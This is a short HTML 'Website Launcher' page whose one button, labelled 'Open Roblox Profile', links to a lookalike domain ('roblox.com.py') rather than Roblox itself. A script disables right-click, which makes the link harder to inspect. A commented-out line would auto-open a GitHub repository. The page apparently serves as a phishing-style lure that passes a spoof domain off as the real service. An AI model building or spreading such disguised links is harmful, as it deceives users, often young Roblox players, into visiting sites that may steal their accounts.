<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Launcher</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .launch-container {
            text-align: center;
            color: white;
        }
        
        .launch-btn {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 20px 40px;
            font-size: 1.5rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
            margin: 20px;
        }
        
        .launch-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: scale(1.05);
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }
        
        .title {
            font-size: 3rem;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <div class="launch-container">
        <h1 class="title">🚀 Website Launcher</h1>
        <a href="https://roblox.com.py/users/208685382716/profile" target="_blank" class="launch-btn">
            Open Roblox Profile
        </a>
        <p style="margin-top: 20px; opacity: 0.8;">Click the button above to open the website in a new tab</p>
    </div>
    
    <script>
        // Prevent right-click
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        
        // Auto-open on load (optional)
        window.addEventListener('load', () => {
            // Uncomment the next line to auto-open the website
            // window.open('https://github.com/phonzr/nyloki', '_blank');
        });
    </script>
</body>
</html>
